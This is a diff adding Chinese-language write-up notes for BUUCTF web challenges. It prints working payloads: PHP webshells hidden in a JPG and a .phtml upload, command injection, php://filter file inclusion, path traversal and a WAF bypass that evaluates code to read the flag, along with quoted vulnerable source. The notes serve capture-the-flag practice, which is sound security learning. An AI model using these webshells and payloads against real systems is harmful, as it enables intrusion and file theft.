@@ -61,6 +61,71 @@ GET /?file=/flag HTTP/1.1
 ```sh
 GET /?username=admin&password=1 HTTP/1.1
 ```
+BurpSuite对密码进行爆破
+### [3 Upload-Labs-Linux](https://buuoj.cn/challenges#Upload-Labs-Linux)
+### [UPLOAD COURSE 1](https://buuoj.cn/challenges#BUU%20UPLOAD%20COURSE%201)
+上传文件，发现会改名成xxx.jpg并储存在uploads上
+写jpg马
+```sh
+echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
+```
+访问
+```
+GET /index.php?file=uploads/6939648e99d96.jpg&cmd=cat%20upload.php HTTP/1.1
+```
+得到upload的代码
+```php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: jinzhao
+ * Date: 2019/7/9
+ * Time: 7:54 AM
+ */
+
+
+if(isset($_FILES['upload_file'])) {
+    @mkdir("uploads/");
+
+
+    $filename = uniqid().".jpg";
+    move_uploaded_file($_FILES["upload_file"]["tmp_name"],
+        "uploads/" . $filename);
+    echo "æä»¶å·²å¨å­å¨: " . "uploads/" . $filename;
+}
+
+?>
+```
+再看index.php的代码
+```php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: jinzhao
+ * Date: 2019/7/9
+ * Time: 7:07 AM
+ */
+
+if(isset($_GET['file'])) {
+    $re = '/^uploads\/[\d|\w]*.jpg$/m';
+    $str = $_GET['file'];
+
+    preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);
+
+    if(count($matches) == 0 && $_GET['file'] !== 'upload.php') {
+        die('ä½ ä¸èå®å¦~');
+    }
+
+    include $_GET['file'];
+} else {
+    Header('Location: index.php?file=upload.php');
+}
+```
+最后发现并不需要，只要cmd中传入ls /就能发现有个flag文件，cmd=cat%20/flag可得flag
+### [Juice Shop](https://buuoj.cn/challenges#Juice%20Shop)
+SQL注入+爆破
+### [xianzhi_xss](https://buuoj.cn/challenges#xianzhi_xss)
+xss lab
 ### [2019 Havefun](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun)
 请求参数`?cat=dog`
 ### [2019 Knife](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Knife)
@@ -1735,3 +1800,151 @@ print(flag)
 ```
 但输出的flag{8159e6c4abdd3b94ce461ed9a1a24017}提交显示InCorrect......
 ### [41 RSA5](https://buuoj.cn/challenges#RSA5)
+
+## Web
+### [Exec](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Exec)
+命令用分号连行
+```sh
+ping xxx;ls /
+ping xxx;cat /flag
+```
+### [Include](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)
+题名Include提示文件包含漏洞，flag.php
+```sh
+http://429fd97a-c441-438a-b43b-0e510cbbd34a.node5.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=flag.php
+```
+### [WarmUp](https://buuoj.cn/challenges#[HCTF%202018]WarmUp) 
+F12源码提示source.php
+```
+http://e349e9a3-a1ca-406e-8339-61b9a7427ddd.node5.buuoj.cn:81/source.php
+```
+? -> %253f
+```sh
+GET /?file=hint.php%253f/../source.php HTTP/1.1
+
+GET /?file=source.php%253f/../hint.php HTTP/1.1
+
+    flag not here, and flag in ffffllllaaaagggg
+
+GET /?file=source.php%253f/../../../../ffffllllaaaagggg HTTP/1.1
+```
+### [Upload](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload)
+页面提示只能上传jpg,png和gif，上传后会改名但不会改后缀，修改filename用.phtml可上传成功
+```sh
+------WebKitFormBoundarytIH6nB2DbB83MTUp
+Content-Disposition: form-data; name="upload_file"; filename="info.phtml"
+Content-Type: image/gif
+
+GIF89a
+<?php @eval($_POST['cmd']); ?>
+
+------WebKitFormBoundarytIH6nB2DbB83MTUp
+```
+然后使用AntSword连接得到根目录下的flag
+### [BackupFile](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile)
+使用dirsearch遍历发现有/index.php.bak文件
+```sh
+./dirsearch.py -u http://be67322c-d5ef-4e37-973d-ad525f873cbf.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403 
+```
+index.php.bak
+```php
+<?php
+include_once "flag.php";
+
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit("Just num!");
+    }
+    $key = intval($key);
+    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo "Try to find out source file!";
+}
+```
+最终
+```sh
+http://be67322c-d5ef-4e37-973d-ad525f873cbf.node5.buuoj.cn:81/index.php/?key=123
+```
+### [Calc](https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Calc)
+```php
+<!--I've set up WAF to ensure security.-->
+<script>
+    $('#calc').submit(function(){
+        $.ajax({
+            url:"calc.php?num="+encodeURIComponent($("#content").val()),
+            type:'GET',
+            success:function(data){
+                $("#result").html(`<div class="alert alert-success">
+            <strong>答案:</strong>${data}
+            </div>`);
+            },
+            error:function(){
+                alert("这啥?算不来!");
+            }
+        })
+        return false;
+    })
+</script>
+
+<?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?>
+```
+输入任意字符串都报错，可能WAF中不允许num变量有字符，那么可以在num前加空格绕过，而php解析时会去掉空格正好又变回了num。
+```
+GET /calc.php?%20num=phpinfo() HTTP/1.1
+
+GET /calc.php?%20num=1;var_dump(scandir(chr(47))) HTTP/1.1
+
+GET /calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) HTTP/1.1
+
+1string(43) "flag{99a11ff3-c370-477e-8aaa-3a13acfb0936}
+"
+```
+### [admin](https://buuoj.cn/challenges#[HCTF%202018]admin)
+
+### [NiZhuanSiWei](https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei)
+```php
+<?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+```sh
+GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1
+
+
+```
